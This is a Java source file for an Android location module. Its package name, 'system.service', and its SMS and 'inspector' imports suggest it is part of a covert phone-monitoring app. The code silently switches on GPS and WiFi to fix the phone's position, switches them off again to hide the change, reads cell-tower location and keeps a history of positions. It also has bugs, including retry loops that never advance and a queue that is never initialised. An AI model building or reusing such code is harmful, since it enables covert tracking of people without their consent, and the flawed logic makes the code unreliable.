package system.service.feature.location;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONObject;

import system.service.R;
import system.service.SmsReceiver;
import system.service.activity.GlobalPrefActivity;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.GpsUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.SIM_TYPE;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.location.BaseStationLocation;
import com.particle.inspector.common.util.location.BaseStationUtil;

import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.os.Bundle;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class LocationUtil 
{
	private static final String LOGTAG = "GpsUtil";
	private static final int DEFAULT_INTERVAL = 60000; // ms
	private static final float DEFAULT_DISTANCE = 100f; // meter
	private static final int DEFAULT_TRY_COUNT = 5;
	private static final int SLEEP_TIME = 5000; // ms
	
	private Context context;
	private LocationManager locationManager = null;
	private MyLocationlistener locationGpsListener = null;
	private MyLocationlistener locationWifiListener = null;
	private LinkedList<Location> locationGpsQueue; // queue for GPS locations
	private LinkedList<Location> locationWifiQueue;// queue for WIFI locations
	private static final int MAX_QUEUE_LEN = 50;   // MAX length for queue
	
	public static final String REALPOSITION = "real";
	public static final String HISTPOSITION = "hist";
	public static final String GPS = "GPS";
	public static final String WIFI = "WIFI";
	
	public boolean sentSMS = false;
	
	public LocationUtil(Context context) {
		this.context = context;
		locationGpsQueue = new LinkedList<Location>();
		try {
			locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
			locationGpsListener = new MyLocationlistener(GPS);
			locationWifiListener = new MyLocationlistener(WIFI);
			//locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationGpsListener);
			//locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationWifiListener);
		} catch (Exception ex) {
			
		}
	}
	
	public void destroy() {
		if (locationManager != null) {
			locationManager.removeUpdates(locationGpsListener);
		}
	}
	
	private void addGpsLocation(Location location) {
        if (this.locationGpsQueue == null) return;
        if (this.locationGpsQueue.size() >= MAX_QUEUE_LEN) this.locationGpsQueue.poll();
        this.locationGpsQueue.offer(location);
    }
	
	private void addWifiLocation(Location location) {
        if (this.locationWifiQueue == null) return;
        if (this.locationWifiQueue.size() >= MAX_QUEUE_LEN) this.locationWifiQueue.poll();
        this.locationWifiQueue.offer(location);
    }
	
	// realOrHistorical:
	//   - "real"        : it is realtime position
	//   - "hist"        : it is historical position
	// type:
	//   - "GPS"         : got by GPS
	//   - "WIFI"        : got by WIFI network
	public Location getGeoLocation(String type, String realOrHistorical)
    {		
		if (locationManager == null) return null;
		
		// ===============================================================================
		// Try to get GPS location (real or historical)
		// ===============================================================================
		// If GPS is not enabled, try to enable it
		boolean tryToEnableGPS = false;
		if (!GpsUtil.isGpsEnabled(context)) {
			int tryCount = 0;
			while (!GpsUtil.isGpsEnabled(context) && tryCount < DEFAULT_TRY_COUNT) {
				GpsUtil.enableGPS(context);
				SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
			}
			
			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
			//if (tryToEnableGPS) SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
		}
		
		// If GPS provider is available
		Location loc = null;
        try {
        	if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
    			loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
    		}
        } catch (Exception ex) {}
        	
        if (loc == null) {
        	//locationManager.removeUpdates(locationGpsListener);
        	Looper.prepare();
        	try {        	
        		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1f, locationGpsListener, Looper.myLooper());
        		Looper.loop();
        	} catch (Exception ex) {
        		Log.e(LOGTAG, ex.getMessage());
        	}
        	SysUtils.threadSleep(100000, LOGTAG);
        }
        	
        // If GPS previously forced to be enabled, try to disable it
    	if (tryToEnableGPS) {
    		GpsUtil.disableGPS(context);
    	}
    	locationManager.removeUpdates(locationGpsListener);
    	//locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationGpsListener);

        // If cannot get any location, return a historical location.
    	if (loc != null) {
    		return loc;
    	}
    	else if (locationGpsQueue.size() > 0) {
    		Looper.loop();
    		realOrHistorical = HISTPOSITION;
    		return locationGpsQueue.getLast();
    	}
        
		// ===============================================================================
		// Try to get WIFI location (real or historical)
		// ===============================================================================
        // If WIFI is not enabled, try to enable it
     	boolean tryToEnableWifi = false;
     	if (!NetworkUtil.isWifiConnected(context)) {
     		int tryCount = 0;
     		while (!NetworkUtil.isWifiConnected(context) && tryCount < DEFAULT_TRY_COUNT) {
     			NetworkUtil.enableWifi(context);
     			SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
     		}
     			
     		if (NetworkUtil.isWifiConnected(context)) tryToEnableWifi = true;
     		//if (tryToEnableWifi) SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
     	}
     	
     	// If network provider is available
     	try {
           	if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
        		loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        	}
        } catch (Exception ex) {}
             	
        if (loc == null) {
        	//locationManager.removeUpdates(locationWifiListener);
        	try {
        		locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 1f, locationWifiListener);
        	} catch (Exception ex) {}
            SysUtils.threadSleep(60000, LOGTAG);
        }
        
        // If network previously forced to be enabled, try to disable it
    	if (tryToEnableWifi) {
    		NetworkUtil.disableWifi(context);
    	}
    	locationManager.removeUpdates(locationWifiListener);
    	//locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationWifiListener);

        // If cannot get any location, return a historical location.
    	if (loc != null) {
    		return loc;
    	}
    	else if (locationWifiQueue.size() > 0) {
    		realOrHistorical = HISTPOSITION;
    		return locationWifiQueue.getLast();
    	}
        
    	return null;
    }
	
	// type:
	//   - GSM   : got by GSM
	//   - CDMA  : got by CDMA(WCDMA/CDMA2000)
	public BaseStationLocation getBaseStationLocation(String type)
    {
		BaseStationLocation bsLoc = null;
		SIM_TYPE simType = NetworkUtil.getNetworkType(context);
		try {
			bsLoc = BaseStationUtil.getCdmaBaseStationLocation(context);
		} catch (Exception ex) {}
		
		if (bsLoc == null) {
			try {
				bsLoc = BaseStationUtil.getGsmBaseStationLocation(context);
			} catch (Exception ex) {}
		}
		
		return bsLoc;
    }
	
	private class MyLocationlistener implements LocationListener 
	{
		private String provider;// GPS or WIFI

		public MyLocationlistener(String provider) {
			this.provider = provider;
		}

		@Override
		public void onLocationChanged(Location location) {
			if (this.provider.equalsIgnoreCase(GPS))
				addGpsLocation(location);
			else if (this.provider.equalsIgnoreCase(WIFI))
				addWifiLocation(location);
		}

		@Override
		public void onProviderDisabled(String provider) {

		}

		@Override
		public void onProviderEnabled(String provider) {
			Log.v(LOGTAG, "onProviderEnabled");
			// updateLocation(provider);
		}

		@Override
		public void onStatusChanged(String provider, int status, Bundle extras) {
			Log.v(LOGTAG, "onStatusChanged");
			// if (status != LocationProvider.AVAILABLE) return;
			// updateLocation(provider);
		};
	}
}
